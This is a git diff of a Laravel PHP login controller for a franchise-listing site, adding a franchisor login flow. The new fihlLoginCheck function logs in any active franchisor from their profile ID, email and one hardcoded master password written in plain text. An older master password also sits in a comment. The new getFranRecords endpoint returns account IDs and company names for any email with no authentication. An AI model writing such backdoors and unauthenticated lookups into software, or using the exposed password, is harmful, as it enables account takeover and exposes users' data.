@@ -231,6 +231,70 @@ class LoginController extends Controller
         else
             return redirect()->back();
     }
+    public function fihlLogin(Request $request)
+    {
+        if (empty($request->user()))
+            return view('fibl/franchisor_login');
+        else
+            return redirect()->back();
+    }
+
+    public function getFranRecords(Request $request)
+    {
+        // dd($request->all());
+        $mail = $request->fmail;
+        $userdata = UserAccount::where('email', $mail)
+            ->where('user_accounts.profile_status', 1)
+            ->where('user_accounts.profile_type', 1)
+            ->join('franchisor_business_details', 'franchisor_business_details.franchisor_id', '=', 'user_accounts.profile_str')
+            ->select('user_accounts.profile_str', 'franchisor_business_details.profile_name', 'franchisor_business_details.company_name')
+            ->get();
+        // dd($userdata);
+        return response()->json($userdata);
+    }
+
+    public function fihlLoginCheck(Request $request)
+    {
+
+        $userData    = UserAccount::query()->where('profile_str', $request->fihl_id)->where('email', $request->email_id)
+            ->where('profile_type', 1)
+            ->where('profile_status', 1)
+            ->first();
+        // dd($userData);
+        if ($userData != null) {
+            $check = $this->checkProfile($userData);
+            if (!empty($check))
+                return $check;
+
+            if ($userData->profile_status == 2) {
+
+                return redirect('fibl/login')->withErrors(['loginFailed' => 'Dear User, Your Email verification is pending, kindly check your mail inbox for verification mail']);
+            }
+
+            if ($userData->profile_status == 3 && $userData->profile_type == 1) {
+
+                return redirect('fibl/login')->withErrors(['loginFailed' => 'Dear franchisor, Your moderation process is pending']);
+            }
+
+            if ($userData->profile_status != 1) {
+                return redirect('fibl/login')->withErrors(['loginFailed' => 'Dear User, Your profile is not active. Please contact admin to activate your profile']);
+            }
+
+
+            if ($request->password == 'lzFMNeH52awcvzy') {
+                if (Auth::login(User::query()->find($userData->user_id))) {
+                    $this->recordLoginTime();
+                    session()->flash('userloggedin', 1);
+                    FranchisorController::franPercentage();
+                    $franData = FranchisorBusinessDetail::query()->select('company_name')->where('franchisor_id', Auth::user()->profile_str)->first();
+
+                    session()->put('name', $franData->company_name);
+                    return redirect('franchisor/myaccount/dashboard');
+                }
+            }
+        }
+        return redirect('fihl/login')->withErrors(['loginFailed' => 'The user ID or password is incorrect. Kindly re-enter.']);
+    }
 
     /**
      * @param Request $request
@@ -252,19 +316,17 @@ class LoginController extends Controller
                 return $check;
 
             if ($userData->profile_status == 2) {
-                // session()->put('loginFailed', '');
+
                 return redirect('fibl/login')->withErrors(['loginFailed' => 'Dear User, Your Email verification is pending, kindly check your mail inbox for verification mail']);
             }
 
             if ($userData->profile_status == 3 && $userData->profile_type == 1) {
-                // session()->put('loginFailed', 'Dear franchisor, Your moderation process is pending');
+
                 return redirect('fibl/login')->withErrors(['loginFailed' => 'Dear franchisor, Your moderation process is pending']);
             }
 
             if ($userData->profile_status != 1) {
                 return redirect('fibl/login')->withErrors(['loginFailed' => 'Dear User, Your profile is not active. Please contact admin to activate your profile']);
-                // session()->put('loginFailed', 'Dear User, Your profile is not active. Please contact admin to activate your profile');
-                // return redirect('fibl/login');
             }
 
             // if($request->password == 'KHBIUB*^211*YIjbkijbclkd%wf' || $mbox) {
@@ -277,10 +339,10 @@ class LoginController extends Controller
                     //     InvestorController::setPercentage();
                     //     return redirect()->to('/');
                     // } else {
-                        FranchisorController::franPercentage();
-                        $franData = FranchisorBusinessDetail::query()->select('company_name')->where('franchisor_id', Auth::user()->profile_str)->first();
-                        session()->put('name', $franData->company_name);
-                        return redirect('franchisor/myaccount/dashboard');
+                    FranchisorController::franPercentage();
+                    $franData = FranchisorBusinessDetail::query()->select('company_name')->where('franchisor_id', Auth::user()->profile_str)->first();
+                    session()->put('name', $franData->company_name);
+                    return redirect('franchisor/myaccount/dashboard');
                     //}
                 }
             }
